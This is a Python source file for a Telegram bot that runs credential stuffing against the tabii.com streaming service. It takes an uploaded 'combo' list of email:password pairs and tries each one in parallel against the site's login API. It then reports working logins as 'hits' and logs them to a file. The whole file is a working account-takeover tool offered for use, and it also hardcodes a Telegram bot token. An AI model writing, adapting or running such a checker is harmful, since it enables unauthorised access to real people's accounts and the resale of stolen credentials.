import requests
import os
import time
import telebot
import pyfiglet
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.exceptions import ConnectionError, Timeout
from telebot.apihelper import ApiTelegramException

# This code was made by @EmirOrj.
####EMR####
Z = '\033[1;36m'
F = '\033[2;32m'
L = '\033[2;36m'
X = '\033[1;33m'
C = '\033[2;36m'
####EMR ####

def print_ascii_art():
    ascii_art = pyfiglet.figlet_format("   TABİİ CHECK ")
    print(Z + ascii_art)
    print(F + "■" * 67)

def tabii_check(username, password):
    url = "https://eu1.tabii.com/apigateway/auth/v2/login"
    headers = {
        'authority': 'eu1.tabii.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'tr',
        'app-version': '1.2.0',
        'content-type': 'application/json',
        'origin': 'https://www.tabii.com',
        'platform': 'Web-Mobile',
        'referer': 'https://www.tabii.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-country-code': 'TR',
    }
    payload = {
        "email": username,
        "password": password,
        "remember": False
    }
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if "validationError" in response.text:
            return False
        else:
            return True
    except (ConnectionError, Timeout):
        return None

def handle_document(message, bot):
    global successful, failed, successful_credentials
    successful = 0
    failed = 0
    successful_credentials = []

    bot.reply_to(message, "Checking...")

    try:
        file_info = bot.get_file(message.document.file_id)
        file_url = f'https://api.telegram.org/file/bot{TOKEN}/{file_info.file_path}'
        response = requests.get(file_url)

        if response.status_code != 200:
            bot.reply_to(message, 'Error: Could not retrieve the file')
            return

        file_path = 'temp.txt'
        with open(file_path, 'wb') as file:
            file.write(response.content)

        with open(file_path, 'r') as file:
            lines = file.readlines()

        report_message_id = bot.send_message(message.chat.id, "Started").message_id

        start_time = time.time()

        # Use ThreadPoolExecutor for concurrent processing
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_credentials = {
                executor.submit(tabii_check, username, password): (username, password)
                for line in lines if ':' in line
                for username, password in [line.strip().split(':', 1)]
            }

            for future in as_completed(future_to_credentials):
                username, password = future_to_credentials[future]
                try:
                    result = future.result()
                    if result is True:
                        successful += 1
                        successful_credentials.append(f"{username}:{password} [ SUCCESSFUL LOGIN ✅ ]\n\n")
                        with open('tabii_check_log.txt', 'a') as log_file:
                            log_file.write(f"{username}:{password} [ SUCCESSFUL LOGIN ✅ ]\n")
                    elif result is False:
                        failed += 1
                        with open('tabii_check_log.txt', 'a') as log_file:
                            log_file.write(f"{username}:{password} [ FAILED LOGIN ❌ ]\n")
                except Exception as e:
                    print(f"Error checking {username}:{password}: {e}")

                elapsed_time = int((time.time() - start_time) * 1000)
                try:
                    report_message = f"✅ HITS > {successful}\n❌ BAD > {failed}"
                    bot.edit_message_text(report_message, message.chat.id, report_message_id)
                except ApiTelegramException as e:
                    if e.result_json['description'].startswith("Too Many Requests"):
                        retry_after = int(e.result_json['parameters'].get('retry_after', 30))
                        print(f"Rate limit hit. Retrying after {retry_after} seconds...")
                        time.sleep(retry_after)
                        bot.edit_message_text(report_message, message.chat.id, report_message_id)
                    else:
                        raise

        final_message = (f"By Ayasa\n\n" +
                         "\n".join(successful_credentials) if successful_credentials else "No successfully checked account found.\n\n" +
                         "Emails and Passwords: @EmirOrj\nChannel: @EmrEngine\n\n" +
                         "This code was made by @EmirOrj.")
        bot.send_message(message.chat.id, final_message)

        os.remove(file_path)

    except FileNotFoundError:
        bot.reply_to(message, 'Error: File not found')
    except Exception as e:
        bot.reply_to(message, f'Error: {e}')

def main():
    print(F + "■" * 67)
    print_ascii_art()
    print(F + "■" * 67)

    global TOKEN
    TOKEN = '7360221164:AAFhFK1zzzYqp3GWBuTAtWMR4L-BknssFcM'  # Your bot token

    bot = telebot.TeleBot(TOKEN)

    @bot.message_handler(commands=['combo'])
    def start_message(message):
        bot.reply_to(message, "SEND THE COMBO")

    @bot.message_handler(content_types=['document'])
    def handle_document_wrapper(message):
        handle_document(message, bot)

    print("BOT ACTIVE ✅")

    # Retry bot polling if it crashes due to connectivity issues
    while True:
        try:
            bot.polling()
        except Exception as e:
            print(f"Error in polling: {e}. Retrying in 15 seconds...")
            time.sleep(15)

if __name__ == "__main__":
    main()
